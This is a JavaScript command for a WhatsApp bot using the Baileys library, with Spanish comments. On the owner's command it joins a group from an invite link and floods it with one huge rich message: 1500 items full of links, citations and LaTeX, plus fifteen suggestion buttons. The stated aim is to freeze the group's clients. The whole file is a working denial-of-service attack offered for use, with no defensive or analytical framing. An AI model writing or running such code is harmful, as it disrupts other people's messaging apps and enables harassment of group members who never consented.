import { AIRich } from "@whiskeysockets/baileys";

export default {
  name: ["crash"],
  description: "Traba un grupo por enlace",
  category: "owner",
  ownerOnly: true,

  async run({ sock, from, text, cmdName, reply }) {
    if (!text || !text.includes("whatsapp.com")) {
      return reply({ text: `Pásame el enlace. Ej: .${cmdName} https://chat.whatsapp.com/XXXX` });
    }

    const match = text.match(/chat\.whatsapp\.com\/([\w\d]+)/i);
    if (!match) return reply({ text: "Enlace inválido." });
    const code = match[1];

    let groupId;
    try {
      groupId = (await sock.groupGetInviteInfo(code)).id;
    } catch {
      return reply({ text: "No pude leer el grupo." });
    }
    try { await sock.groupAcceptInvite(code); } catch {}
    await new Promise((r) => setTimeout(r, 2500));

    await reply({ text: `💥 Crasheando ${groupId}...` });

    // UN SOLO rich, pero gigante. Nada de paralelo.
    const rich = new AIRich(sock);
    rich.setTitle("💥💥💥 CRASH 💥💥💥");

    // 1500 items con todo activado: link + citation + latex
    for (let i = 0; i < 1500; i++) {
      rich.addText(`Item ${i} [x](https://x.com) [](https://y.com) $\\sum_{n=1}^{\\infty} \\frac{1}{n^2} = \\frac{\\pi^2}{6}$`);
    }

    rich.addSuggest(["1","2","3","4","5","6","7","8","9","10","11","12","13","14","15"]);
    rich.setFooter("boom 💀");

    try {
      await rich.send(groupId);
      return reply({ text: "✅ rich enviado. Revisa si el grupo se trabó." });
    } catch (e) {
      return reply({ text: `❌ ${e.message}` });
    }
  },
};